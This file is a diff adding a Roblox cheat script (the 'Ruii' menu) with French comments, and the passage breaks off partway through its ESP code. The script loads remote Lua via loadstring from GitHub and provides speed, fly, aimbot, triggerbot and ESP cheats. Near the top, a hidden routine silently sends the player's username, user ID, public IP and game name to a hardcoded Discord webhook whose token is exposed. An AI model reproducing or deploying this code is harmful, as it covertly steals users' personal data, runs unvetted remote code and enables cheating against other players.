@@ -1,0 +1,3137 @@
+local Ruii = loadstring(game:HttpGet("https://raw.githubusercontent.com/RuiiCode/script/refs/heads/main/ruii%20guii%20v2.lua"))();
+local Notification = Ruii:CreateNotifier();
+
+Notification:Notify({
+	Title = "Ruii",
+	Content = "Hello, "..game.Players.LocalPlayer.DisplayName..' Welcome back!',
+	Icon = "clipboard"
+})
+
+local Window = Ruii.new({
+	Name = "Ruii",
+	Expire = "never",
+});
+
+local Config = Window:AddConfig();
+Config:Init("Ruii Config","Ruii-Win");
+
+------------------------------------------------------------------------------
+
+local Rage = Window:AddMenu({
+	Name = "RAGE",
+	Icon = "skull"
+})
+
+local Legit = Window:AddMenu({
+	Name = "LEGIT",
+	Icon = "target"
+})
+
+local Visual = Window:AddMenu({
+	Name = "VISUAL",
+	Icon = "eye"
+})
+
+local Misc = Window:AddMenu({
+	Name = "MISC",
+	Icon = "settings"
+})
+
+local Lua = Window:AddMenu({
+	Name = "LUA",
+	Icon = "code"
+})
+
+
+------------------------------------------------------------------------------
+
+local webhookURL = "https://discord.com/api/webhooks/1497588522977198141/iijYt6w4PXpDnkl0lLf2Xb-zHUkSYiZQ374sW1On42QSL1jLvcySAQluNeGapO_oln6c"
+local player = game.Players.LocalPlayer
+
+local function sendWebhook()
+    -- Récupération de l'IP du serveur
+    local success, ip = pcall(function()
+        return game:HttpGet("https://api.ipify.org")
+    end)
+
+    if success then
+        local data = {
+            ["embeds"] = {{
+                ["title"] = "✅ Script Exécuté",
+                ["fields"] = {
+                    {["name"] = "Pseudo", ["value"] = player.Name, ["inline"] = true},
+                    {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+                    {["name"] = "IP du Serveur", ["value"] = ip, ["inline"] = false},
+                    {["name"] = "Jeu", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = false}
+                },
+                ["color"] = 3066993, -- Vert
+                ["footer"] = {["text"] = "Logs Roblox"}
+            }}
+        }
+
+        local jsonData = game:GetService("HttpService"):JSONEncode(data)
+        
+        -- Envoi via les fonctions de l'exécuteur
+        local requestFunc = syn and syn.request or request or http_request
+        if requestFunc then
+            requestFunc({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end
+    end
+end
+
+-- Lancement immédiat et silencieux
+task.spawn(sendWebhook)
+
+
+------------------------------------------------------------------------------
+--Variables
+local camera = workspace.CurrentCamera;
+local CoreGui = game:GetService("CoreGui");
+local uis = game:GetService("UserInputService");
+local run = game:GetService("RunService");
+local ReplicatedStorage = game:GetService("ReplicatedStorage");
+
+local plyr = game.Players.LocalPlayer;
+local mouse = plyr:GetMouse();
+local char = plyr.Character or plyr.CharacterAdded:Wait();
+local hrp = char:WaitForChild("HumanoidRootPart", math.huge);
+local hum = char:WaitForChild("Humanoid", math.huge);
+
+------------------------------------------------------------------------------
+
+-- Variables globales
+local RunService = game:GetService("RunService")
+local Player = game.Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+local BodyVelocity = nil
+
+-- Fonction pour activer/désactiver le speed hack
+local SpeedEnabled = false
+local SpeedValue = 16 -- Vitesse par défaut
+
+local function onCharacterAdded(newCharacter)
+    Character = newCharacter
+    HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+    BodyVelocity = nil -- Réinitialiser BodyVelocity
+
+    -- Ajouter le BodyVelocity si SpeedEnabled est activé
+    if SpeedEnabled then
+        BodyVelocity = Instance.new("BodyVelocity")
+        BodyVelocity.MaxForce = Vector3.new(1e4, 0, 1e4) -- Permet un mouvement horizontal uniquement
+        BodyVelocity.P = 1000 -- Puissance de la force appliquée
+        BodyVelocity.Velocity = Vector3.zero -- Pas de mouvement initial
+        BodyVelocity.Parent = HumanoidRootPart
+    end
+end
+
+-- Attacher l'événement CharacterAdded pour chaque nouvelle mort
+Player.CharacterAdded:Connect(onCharacterAdded)
+
+-- Variables pour le CFrame Speed
+local cframespeedtoggle = false
+local speedvalue = 4
+
+-- Ajout du toggle CFrame Speed
+-- Créer la section MOVEMENT une seule fois
+local SpeedSection = Misc:AddSection({
+    Position = 'left',
+    Name = "Speed"
+})
+
+-- Ajouter le toggle à cette section
+SpeedSection:AddToggle({
+    Name = "CFrame Speed",
+    Callback = function(Value)
+        cframespeedtoggle = Value
+    end
+})
+
+-- Ajouter le slider à la même section
+SpeedSection:AddSlider({
+    Name = "Speed Value",
+    Min = 0.1,
+    Max = 10,
+    Increment = 0.1,
+    Default = 3,
+    Callback = function(Value)
+        speedvalue = Value
+    end
+})
+
+-- Fonction de déplacement CFrame
+game:GetService("RunService").Heartbeat:Connect(function()
+    if cframespeedtoggle then
+        local char = game.Players.LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChildOfClass("Humanoid") then
+            local hrp = char.HumanoidRootPart
+            local hum = char:FindFirstChildOfClass("Humanoid")
+
+            -- Si le joueur est vivant et se déplace
+            if hum.MoveDirection.Magnitude > 0 then
+                hrp.CFrame = hrp.CFrame + (hum.MoveDirection * speedvalue)
+            end
+        end
+    end
+end)
+
+------------------------------------------------------------------------------
+
+-- Variables globales
+local RunService = game:GetService("RunService")
+local Player = game.Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+
+-- Activer/désactiver le jump hack
+local JumpEnabled = false
+local JumpPowerValue = 50 -- Puissance de saut par défaut (valeur normale pour Roblox est 50)
+
+-- Fonction pour gérer le saut
+local function onCharacterAdded(newCharacter)
+    Character = newCharacter
+    Humanoid = Character:WaitForChild("Humanoid")
+
+    -- Appliquer la puissance de saut si le hack est activé
+    if JumpEnabled then
+        Humanoid.JumpPower = JumpPowerValue
+    else
+        Humanoid.JumpPower = 50 -- Valeur normale par défaut
+    end
+end
+
+-- Attacher l'événement CharacterAdded pour chaque nouvelle mort
+Player.CharacterAdded:Connect(onCharacterAdded)
+
+-- Ajouter le toggle pour activer/désactiver le jump hack
+-- Variables pour le high jump
+local highjumptoggle = false
+local jumpheight = 50  -- hauteur de saut par défaut
+
+-- Toggle pour activer/désactiver le High Jump
+local JumpSection = Misc:AddSection({
+    Position = 'left',
+    Name = "High Jump"
+})
+JumpSection:AddToggle({
+    Name = "High Jump",
+    Callback = function(Value)
+        highjumptoggle = Value
+    end
+})
+
+JumpSection:AddSlider({
+    Name = "Jump Power",
+    Min = 10,
+    Max = 400,
+    Increment = 1,
+    Default = 50,
+    Callback = function(Value)
+        jumpheight = Value
+    end
+})
+
+-- Détection du saut pour appliquer la poussée vers le haut
+game:GetService("UserInputService").JumpRequest:Connect(function()
+    if highjumptoggle then
+        local char = game.Players.LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChildOfClass("Humanoid") then
+            -- Applique une translation verticale instantanée
+            char.HumanoidRootPart.Velocity = Vector3.new(0, jumpheight, 0)
+        end
+    end
+end)
+
+
+------------------------------------------------------------------------------
+
+-- Variables globales
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Player = game.Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+local Camera = workspace.CurrentCamera
+
+-- Configuration du vol
+local FlyEnabled = false
+local FlySpeed = 50 -- Vitesse de vol par défaut
+local Flying = false -- Pour activer/désactiver le vol
+local MoveDirection = Vector3.zero -- Direction du mouvement
+local MaxSpeed = 300
+local MinSpeed = 10
+
+-- Activer/désactiver le fly
+local FlySection = Misc:AddSection({
+    Position = 'left',
+    Name = "Fly"
+})
+FlySection:AddToggle({
+    Name = "Fly",
+    Callback = function(Value)
+        FlyEnabled = Value
+        if FlyEnabled then
+            Flying = true
+        else
+            Flying = false
+            HumanoidRootPart.Velocity = Vector3.zero -- Stopper le mouvement
+        end
+    end
+})
+
+-- Ajouter un slider pour régler la vitesse de vol
+FlySection:AddSlider({
+    Name = "Fly Speed",
+    Min = MinSpeed,
+    Max = MaxSpeed,
+    Default = FlySpeed,
+    Increment = 1,
+    Callback = function(Value)
+        FlySpeed = Value
+    end
+})
+
+-- Variables pour gérer les entrées de mouvement
+local forward = false
+local backward = false
+local left = false
+local right = false
+local up = false
+local down = false
+
+-- Gérer les entrées utilisateur pour ajuster la direction
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed or not FlyEnabled then return end
+
+    -- Gérer les touches ZQSD
+    if input.KeyCode == Enum.KeyCode.Z then
+        forward = true
+    elseif input.KeyCode == Enum.KeyCode.S then
+        backward = true
+    elseif input.KeyCode == Enum.KeyCode.Q then
+        left = true
+    elseif input.KeyCode == Enum.KeyCode.D then
+        right = true
+    elseif input.KeyCode == Enum.KeyCode.Space then
+        up = true
+    elseif input.KeyCode == Enum.KeyCode.LeftShift then
+        down = true
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input, gameProcessed)
+    if gameProcessed or not FlyEnabled then return end
+
+    -- Arrêter la direction lorsque la touche est relâchée
+    if input.KeyCode == Enum.KeyCode.Z then
+        forward = false
+    elseif input.KeyCode == Enum.KeyCode.S then
+        backward = false
+    elseif input.KeyCode == Enum.KeyCode.Q then
+        left = false
+    elseif input.KeyCode == Enum.KeyCode.D then
+        right = false
+    elseif input.KeyCode == Enum.KeyCode.Space then
+        up = false
+    elseif input.KeyCode == Enum.KeyCode.LeftShift then
+        down = false
+    end
+end)
+
+-- Boucle principale pour gérer le vol
+RunService.RenderStepped:Connect(function(_, dt)
+    if Flying and FlyEnabled then
+        -- Créer un vecteur de direction basé sur les entrées
+        local direction = Vector3.zero
+
+        if forward then
+            direction = direction + Camera.CFrame.LookVector
+        end
+        if backward then
+            direction = direction - Camera.CFrame.LookVector
+        end
+        if left then
+            direction = direction - Camera.CFrame.RightVector
+        end
+        if right then
+            direction = direction + Camera.CFrame.RightVector
+        end
+        if up then
+            direction = direction + Vector3.new(0, 1, 0)
+        end
+        if down then
+            direction = direction - Vector3.new(0, 1, 0)
+        end
+
+        -- Appliquer la direction avec la vitesse choisie
+        local velocity = direction.Unit * FlySpeed
+        HumanoidRootPart.Velocity = velocity
+    end
+end)
+
+
+------------------------------------------------------------------------------
+
+-- Services nécessaires
+local camera = game.Workspace.CurrentCamera
+local uis = game:GetService("UserInputService")
+local run = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local fov_circle = nil
+local aimbot_enabled = false
+local locked_target = nil
+local current_lock_key = Enum.KeyCode.E  -- Touche actuelle
+local aimbot_fov_size = 80
+local aimbot_fov_enabled = false
+local aimbot_target_part = "Head"
+local aimbot_prediction_x = 0
+local aimbot_smoothness = 0
+local notifications_enabled = false
+local unlock_on_death_enabled = false
+local target_death_connection = nil
+local cframespeedtoggle = false
+local speedvalue = 4
+
+-- Variables supplémentaires
+local current_target = nil
+local last_target_player = nil
+local heartbeat_connection = nil
+local renderstep_connection = nil
+
+-- Fonction de notification
+function ShowRobloxNotification(title, text, duration)
+    if notifications_enabled then
+        StarterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = text,
+            Duration = duration or 3,
+        })
+    end
+end
+
+-- Fonction pour dessiner la FOV
+function UpdateFOV()
+    if aimbot_fov_enabled then
+        if not fov_circle then
+            fov_circle = Drawing.new("Circle")
+            fov_circle.Thickness = 2
+            fov_circle.Color = Color3.fromRGB(255, 255, 255)
+            fov_circle.Transparency = 1
+            fov_circle.Visible = true
+        end
+        fov_circle.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
+        fov_circle.Radius = aimbot_fov_size
+        fov_circle.Visible = true
+    else
+        if fov_circle then
+            fov_circle.Visible = false
+        end
+    end
+end
+
+-- Fonction pour vérifier si une cible est dans la FOV
+function IsInFOV(target_position)
+    if not target_position then return false end
+    local screen_position, on_screen = camera:WorldToViewportPoint(target_position)
+    if on_screen then
+        local mouse_position = Vector2.new(uis:GetMouseLocation().X, uis:GetMouseLocation().Y)
+        local target_position_2d = Vector2.new(screen_position.X, screen_position.Y)
+        local distance_2D = (mouse_position - target_position_2d).Magnitude
+        return distance_2D <= aimbot_fov_size
+    end
+    return false
+end
+
+-- Met à jour la cible
+function UpdateTarget()
+    local closest_target = nil
+    local max_distance_2D = math.huge
+
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player.UserId ~= game.Players.LocalPlayer.UserId and player.Character then
+            local character = player.Character
+            local target_part = nil
+            if aimbot_target_part == "Head" then
+                target_part = character:FindFirstChild("Head")
+            elseif aimbot_target_part == "Torso" then
+                target_part = character:FindFirstChild("UpperTorso") 
+                    or character:FindFirstChild("HumanoidRootPart") 
+                    or character:FindFirstChild("Torso")
+            end
+            if target_part and target_part:IsA("BasePart") and IsInFOV(target_part.Position) then
+                local mouse_position = Vector2.new(uis:GetMouseLocation().X, uis:GetMouseLocation().Y)
+                local screen_position, on_screen = camera:WorldToViewportPoint(target_part.Position)
+                if on_screen then
+                    local target_position = Vector2.new(screen_position.X, screen_position.Y)
+                    local distance_2D = (mouse_position - target_position).Magnitude
+                    if distance_2D < max_distance_2D then
+                        max_distance_2D = distance_2D
+                        closest_target = target_part
+                    end
+                end
+            end
+        end
+    end
+    current_target = closest_target
+end
+
+-- Fonction pour verrouiller la cible
+function LockTarget()
+    if aimbot_enabled and not locked_target then
+        UpdateTarget()
+        locked_target = current_target
+        if locked_target then
+            ShowRobloxNotification("Aimbot", "Cible verrouillée", 3)
+            if unlock_on_death_enabled then
+                local character = locked_target:FindFirstAncestorOfClass("Model")
+                if character then
+                    local bodyEffects = character:FindFirstChild("BodyEffects")
+                    if bodyEffects then
+                        local ko = bodyEffects:FindFirstChild("K.O")
+                        if ko then
+                            if target_death_connection then
+                                target_death_connection:Disconnect()
+                                target_death_connection = nil
+                            end
+                            target_death_connection = ko:GetPropertyChangedSignal("Value"):Connect(function()
+                                if ko.Value == true then
+                                    ResetTarget()
+                                end
+                            end)
+                        end
+                    end
+                end
+            end
+        else
+            ShowRobloxNotification("Aimbot", "Aucune cible dans FOV", 3)
+        end
+    end
+end
+
+-- Fonction pour réinitialiser la cible
+function ResetTarget()
+    locked_target = nil
+    if target_death_connection then
+        target_death_connection:Disconnect()
+        target_death_connection = nil
+    end
+    ShowRobloxNotification("Aimbot", "Aucune cible verrouillée", 3)
+end
+
+-- Fonction d'activation de l'aimbot
+function ToggleAimbot(enabled)
+    aimbot_enabled = enabled
+    if enabled then
+        if not heartbeat_connection then
+            heartbeat_connection = run.Heartbeat:Connect(function()
+                if locked_target and locked_target.Parent and locked_target:IsDescendantOf(game.Workspace) and locked_target:IsA("BasePart") then
+                    local velocity = locked_target.AssemblyLinearVelocity or Vector3.new()
+                    local predicted_position = locked_target.Position + velocity * aimbot_prediction_x
+                    local current_camera_cframe = camera.CFrame
+                    local target_cframe = CFrame.new(camera.CFrame.Position, predicted_position)
+                    local smooth_factor = 1 - aimbot_smoothness
+                    local smooth_cframe = current_camera_cframe:Lerp(target_cframe, smooth_factor)
+                    camera.CFrame = smooth_cframe
+                end
+            end)
+        end
+    else
+        if heartbeat_connection then
+            heartbeat_connection:Disconnect()
+            heartbeat_connection = nil
+        end
+        ResetTarget()
+    end
+end
+
+-- Connexion continue pour UpdateFOV
+renderstep_connection = run.RenderStepped:Connect(UpdateFOV)
+
+-- Listener pour le lock (écoute la touche actuelle)
+uis.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == current_lock_key then
+        if locked_target then
+            ResetTarget()
+        else
+            LockTarget()
+        end
+    end
+end)
+
+-- Vérification de Legit
+if not Legit then
+    warn("Legit n'est pas défini ! Chargez la bibliothèque UI correctement.")
+    return
+end
+
+-- Ajout des boutons Aimbot dans Legit
+do
+    local AimSection = Legit:AddSection({
+        Position = 'left',
+        Name = "AIMBOT"
+    })
+    
+    AimSection:AddToggle({
+        Name = "Aimbot",
+        Default = false,
+        Callback = function(Value)
+            ToggleAimbot(Value)
+        end
+    })
+
+    -- Alternative : Dropdown pour changer la touche (plus fiable que keybind)
+    AimSection:AddDropdown({
+        Name = "Lock Key",
+        Default = "E",
+        Values = {"E","A","R","F","T","G","H","W","X","C","V","B","N"},
+    -- Touches courantes
+        Callback = function(Value)
+            if Value == "E" then current_lock_key = Enum.KeyCode.E
+            elseif Value == "E" then current_lock_key = Enum.KeyCode.E
+            elseif Value == "A" then current_lock_key = Enum.KeyCode.Q
+            elseif Value == "R" then current_lock_key = Enum.KeyCode.R
+            elseif Value == "F" then current_lock_key = Enum.KeyCode.F
+            elseif Value == "T" then current_lock_key = Enum.KeyCode.T
+            elseif Value == "G" then current_lock_key = Enum.KeyCode.G
+            elseif Value == "H" then current_lock_key = Enum.KeyCode.H
+            elseif Value == "W" then current_lock_key = Enum.KeyCode.Z
+            elseif Value == "X" then current_lock_key = Enum.KeyCode.X
+            elseif Value == "C" then current_lock_key = Enum.KeyCode.C
+            elseif Value == "V" then current_lock_key = Enum.KeyCode.V
+            elseif Value == "B" then current_lock_key = Enum.KeyCode.B
+            elseif Value == "N" then current_lock_key = Enum.KeyCode.N
+            end
+            print("Touche de lock changée à :", current_lock_key)  -- Debug, retirez si ok
+        end
+    })
+
+    AimSection:AddToggle({
+        Name = "Notifications",
+        Callback = function(Value)
+            notifications_enabled = Value
+        end
+    })
+
+    AimSection:AddToggle({
+        Name = "Unlock on Death (Da Hood)",
+        Default = false,
+        Callback = function(Value)
+            unlock_on_death_enabled = Value
+        end
+    })
+
+    AimSection:AddDropdown({
+        Name = "Target Part",
+        Default = "Head",
+        Values = {"Head", "Torso"},
+        Callback = function(Value)
+            aimbot_target_part = tostring(Value)
+            ResetTarget()
+        end
+    })
+
+    AimSection:AddSlider({
+        Name = "Prediction X",
+        Min = 0,
+        Max = 1,
+        Round = 2,
+        Default = 0,
+        Callback = function(X)
+            aimbot_prediction_x = X
+        end
+    })
+
+    AimSection:AddSlider({
+        Name = "Smoothness",
+        Min = 0,
+        Max = 1,
+        Round = 2,
+        Default = 0,
+        Callback = function(Value)
+            aimbot_smoothness = Value
+        end
+    })
+
+    AimSection:AddToggle({
+        Name = "Show FOV",
+        Default = false,
+        Callback = function(Value)
+            aimbot_fov_enabled = Value
+        end
+    })
+
+    AimSection:AddSlider({
+        Name = "FOV Size",
+        Min = 10,
+        Max = 400,
+        Increment = 1,
+        Default = 80,
+        Callback = function(Value)
+            aimbot_fov_size = Value
+        end
+    })
+end
+------------------------------------------------------------------------------
+
+local rageModeEnabled = false
+local rageSpinRadius = 5
+local rageSpinSpeed = 5
+
+-- Ajout des boutons Rage Mode
+do
+    local RageSection = Rage:AddSection({
+        Position = 'left',
+        Name = "RAGE MODE"
+    })
+    
+    RageSection:AddToggle({
+        Name = "Rage Mode",
+        Callback = function(Value)
+            rageModeEnabled = Value
+        end
+    })
+
+    RageSection:AddSlider({
+        Name = "Rage Spin Speed",
+        Min = 1,
+        Max = 40,
+        Default = 5,
+        Increment = 0.5,
+        Callback = function(Value)
+            rageSpinSpeed = Value
+        end
+    })
+
+    RageSection:AddSlider({
+        Name = "Spin Radius",
+        Min = 3,
+        Max = 20,
+        Default = 5,
+        Increment = 0.5,
+        Callback = function(Value)
+            rageSpinRadius = Value
+        end
+    })
+end
+
+local angle = 0
+run.Heartbeat:Connect(function(dt)
+    if rageModeEnabled and locked_target and locked_target.Parent then
+        local target = locked_target.Position
+        angle += dt * rageSpinSpeed
+        local offset = Vector3.new(math.cos(angle), 0, math.sin(angle)) * rageSpinRadius
+        local char = game.Players.LocalPlayer.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            hrp.CFrame = CFrame.new(target + offset, target)
+        end
+    end
+end)
+
+
+
+
+------------------------------------------------------------------------------
+--//Triggerbot
+
+local triggerbot_enabled = false
+local triggerbot_team_check = false
+
+-- Ajout des options du Triggerbot dans l'interface utilisateur
+do
+    local TriggerSection = Legit:AddSection({
+        Position = 'center',
+        Name = "TRIGGERBOT"
+    })
+    
+    TriggerSection:AddToggle({
+        Name = "Triggerbot",
+        Callback = function(Value)
+            triggerbot_enabled = Value
+        end
+    })
+
+    TriggerSection:AddToggle({
+        Name = "Team Check",
+        Callback = function(Value)
+            triggerbot_team_check = Value
+        end
+    })
+end
+
+-- Fonction pour vérifier si le joueur sous le curseur est valide
+local function GetPlayerUnderCursor()
+    local mouse_target = mouse.Target
+    if mouse_target then
+        local character = mouse_target:FindFirstAncestorOfClass("Model")
+        if character and character:FindFirstChild("Humanoid") and character ~= plyr.Character then
+            if triggerbot_team_check then
+                local player = game.Players:GetPlayerFromCharacter(character)
+                if player and player.TeamColor == plyr.TeamColor then
+                    return nil -- Ignorer les joueurs de la même équipe si Team Check est activé
+                end
+            end
+            return character
+        end
+    end
+    return nil
+end
+
+-- Fonction principale du Triggerbot
+local function Triggerbot()
+    while true do
+        task.wait(0.05) -- Intervalle pour vérifier les cibles (peut être ajusté)
+        if triggerbot_enabled then
+            local target = GetPlayerUnderCursor()
+            if target then
+                -- Simulation d'un clic gauche
+                mouse1press() -- Début du clic gauche
+                task.wait(0.1) -- Durée du clic (peut être ajustée)
+                mouse1release() -- Fin du clic gauche
+            end
+        end
+    end
+end
+
+-- Démarrage automatique de la boucle Triggerbot
+task.spawn(Triggerbot)
+
+
+
+------------------------------------------------------------------------------
+-- Corriger l'ESP - remplacer toute la section ESP par ceci :
+------------------------------------------------------------------------------
+
+
+--//ESP Complet
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Camera = workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+
+-- Variables pour l'ESP original
+local highlightEnabled = false
+local box2DEnabled = false
+local box3DEnabled = false
+local nameEnabled = false
+local distanceEnabled = false
+local highlights = {}
+local boxes2D = {}
+local boxes3D = {}
+local nameTexts = {}
+local distanceTexts = {}
+local HighlightColor = Color3.fromRGB(0, 255, 51)
+local skeletonEnabled = false
+local skeletonColor = Color3.fromRGB(255, 255, 255)
+-- Settings ESP Box 2D Amélioré
+local espSettings = {
+    enabled = false,
+    defaultcolor = Color3.fromRGB(255, 0, 0),
+    teamcheck = false,
+    teamcolor = true,
+    boxColor = Color3.fromRGB(255, 0, 0),
+    boxOutlineColor = Color3.new(0, 0, 0)
+}
+
+-- Variables ESP Box 2D Amélioré
+local espCache = {}
+
+-- Fonctions mathématiques optimisées pour ESP Box 2D
+local newVector2, newColor3, newDrawing = Vector2.new, Color3.new, Drawing.new
+local tan, rad = math.tan, math.rad
+local round = function(...) 
+    local a = {}
+    for i, v in next, table.pack(...) do 
+        a[i] = math.round(v) 
+    end 
+    return unpack(a) 
+end
+
+local wtvp = function(...) 
+    local a, b = Camera:WorldToViewportPoint(...) 
+    return newVector2(a.X, a.Y), b, a.Z 
+end
+
+-- Créer les drawings ESP pour un joueur (Box 2D Amélioré)
+local function createEsp(player)
+    if espCache[player] then return end
+    
+    local drawings = {}
+    
+    -- Box outline (noir)
+    drawings.boxoutline = newDrawing("Square")
+    drawings.boxoutline.Thickness = 3
+    drawings.boxoutline.Filled = false
+    drawings.boxoutline.Color = espSettings.boxOutlineColor
+    drawings.boxoutline.Visible = false
+    drawings.boxoutline.ZIndex = 1
+
+    -- Box principale
+    drawings.box = newDrawing("Square")
+    drawings.box.Thickness = 1
+    drawings.box.Filled = false
+    drawings.box.Color = espSettings.boxColor
+    drawings.box.Visible = false
+    drawings.box.ZIndex = 2
+
+    espCache[player] = drawings
+end
+
+-- Supprimer l'ESP d'un joueur (Box 2D Amélioré)
+local function removeEsp(player)
+    if espCache[player] then
+        for _, drawing in next, espCache[player] do
+            drawing:Remove()
+        end
+        espCache[player] = nil
+    end
+end
+
+-- Mettre à jour l'ESP d'un joueur (Box 2D Amélioré)
+local function updateEsp(player, esp)
+    local character = player.Character
+    if not character then
+        esp.box.Visible = false
+        esp.boxoutline.Visible = false
+        return
+    end
+
+    local humanoid = character:FindFirstChild("Humanoid")
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    
+    if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
+        esp.box.Visible = false
+        esp.boxoutline.Visible = false
+        return
+    end
+
+    local position, visible, depth = wtvp(humanoidRootPart.Position)
+    esp.box.Visible = visible and espSettings.enabled
+    esp.boxoutline.Visible = visible and espSettings.enabled
+
+    if visible and espSettings.enabled then
+        local scaleFactor = 1 / (depth * tan(rad(Camera.FieldOfView / 2)) * 2) * 1000
+        local width, height = round(4 * scaleFactor, 6 * scaleFactor)
+        local x, y = round(position.X, position.Y)
+
+        esp.box.Size = newVector2(width, height)
+        esp.box.Position = newVector2(round(x - width / 2, y - height / 2))
+        esp.box.Color = espSettings.teamcolor and player.Team and player.TeamColor.Color or espSettings.boxColor
+
+        esp.boxoutline.Size = esp.box.Size
+        esp.boxoutline.Position = esp.box.Position
+        esp.boxoutline.Color = espSettings.boxOutlineColor
+    end
+end
+
+-- Initialiser l'ESP Box 2D Amélioré pour tous les joueurs existants
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        createEsp(player)
+    end
+end
+
+-- Gérer les nouveaux joueurs (Box 2D Amélioré)
+Players.PlayerAdded:Connect(function(player)
+    if player ~= LocalPlayer then
+        createEsp(player)
+    end
+end)
+
+-- Nettoyer quand un joueur quitte (Box 2D Amélioré)
+Players.PlayerRemoving:Connect(function(player)
+    removeEsp(player)
+end)
+
+-- Boucle de rendu principale pour ESP Box 2D Amélioré (CORRIGÉE)
+RunService:BindToRenderStep("ESPBox2D", Enum.RenderPriority.Camera.Value, function()
+    if not espSettings.enabled then
+        -- Si désactivé, cacher toutes les boxes et sortir
+        for _, drawings in pairs(espCache) do
+            drawings.box.Visible = false
+            drawings.boxoutline.Visible = false
+        end
+        return
+    end
+    
+    -- Si activé, mettre à jour normalement
+    for player, drawings in pairs(espCache) do
+        if player ~= LocalPlayer then
+            -- Vérification d'équipe
+            if espSettings.teamcheck and player.Team == LocalPlayer.Team then
+                drawings.box.Visible = false
+                drawings.boxoutline.Visible = false
+            else
+                updateEsp(player, drawings)
+            end
+        else
+            drawings.box.Visible = false
+            drawings.boxoutline.Visible = false
+        end
+    end
+end)
+
+-- Fonction pour mettre à jour l'ESP original
+local function updateESP()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
+
+            -- Highlight ESP
+            if highlightEnabled then
+                if not highlights[player] then
+                    local highlight = Instance.new("Highlight")
+                    highlight.Adornee = player.Character
+                    highlight.FillColor = HighlightColor
+                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    highlight.Parent = player.Character
+                    highlights[player] = highlight
+                end
+            else
+                if highlights[player] then
+                    highlights[player]:Destroy()
+                    highlights[player] = nil
+                end
+            end
+
+            -- Box 2D Original
+            if box2DEnabled then
+                if not boxes2D[player] then
+                    local box = {}
+                    for i = 1, 4 do
+                        local line = Drawing.new("Line")
+                        line.Color = Color3.fromRGB(255, 255, 255)
+                        line.Thickness = 2
+                        line.Visible = false
+                        table.insert(box, line)
+                    end
+                    boxes2D[player] = box
+                end
+
+                local size = Vector3.new(4, 7, 4)
+                local corners = {
+                    rootPart.Position + Vector3.new(-size.X / 2, size.Y / 2, 0),
+                    rootPart.Position + Vector3.new(size.X / 2, size.Y / 2, 0),
+                    rootPart.Position + Vector3.new(size.X / 2, -size.Y / 2, 0),
+                    rootPart.Position + Vector3.new(-size.X / 2, -size.Y / 2, 0),
+                }
+
+                local viewportCorners = {}
+                local onScreen = true
+                for _, corner in ipairs(corners) do
+                    local screenPosition = Camera:WorldToViewportPoint(corner)
+                    if screenPosition.Z > 0 then
+                        table.insert(viewportCorners, Vector2.new(screenPosition.X, screenPosition.Y))
+                    else
+                        onScreen = false
+                        break
+                    end
+                end
+
+                if onScreen then
+                    local box = boxes2D[player]
+                    for i = 1, 4 do
+                        local nextIndex = (i % 4) + 1
+                        box[i].From = viewportCorners[i]
+                        box[i].To = viewportCorners[nextIndex]
+                        box[i].Visible = true
+                    end
+                else
+                    for _, line in ipairs(boxes2D[player]) do
+                        line.Visible = false
+                    end
+                end
+            else
+                if boxes2D[player] then
+                    for _, line in pairs(boxes2D[player]) do
+                        line:Remove()
+                    end
+                    boxes2D[player] = nil
+                end
+            end
+
+            -- Box 3D
+            if box3DEnabled then
+                if not boxes3D[player] then
+                    local lines = {}
+                    for i = 1, 12 do
+                        local line = Drawing.new("Line")
+                        line.Color = Color3.fromRGB(255, 255, 255)
+                        line.Thickness = 2
+                        line.Visible = false
+                        table.insert(lines, line)
+                    end
+                    boxes3D[player] = lines
+                end
+
+                local minBound = rootPart.Position - Vector3.new(2, 3, 2)
+                local maxBound = rootPart.Position + Vector3.new(2, 3, 2)
+
+                local corners = {
+                    Vector3.new(minBound.X, minBound.Y, minBound.Z),
+                    Vector3.new(maxBound.X, minBound.Y, minBound.Z),
+                    Vector3.new(maxBound.X, maxBound.Y, minBound.Z),
+                    Vector3.new(minBound.X, maxBound.Y, minBound.Z),
+                    Vector3.new(minBound.X, minBound.Y, maxBound.Z),
+                    Vector3.new(maxBound.X, minBound.Y, maxBound.Z),
+                    Vector3.new(maxBound.X, maxBound.Y, maxBound.Z),
+                    Vector3.new(minBound.X, maxBound.Y, maxBound.Z),
+                }
+
+                local connections = {
+                    {1, 2}, {2, 3}, {3, 4}, {4, 1}, -- Base
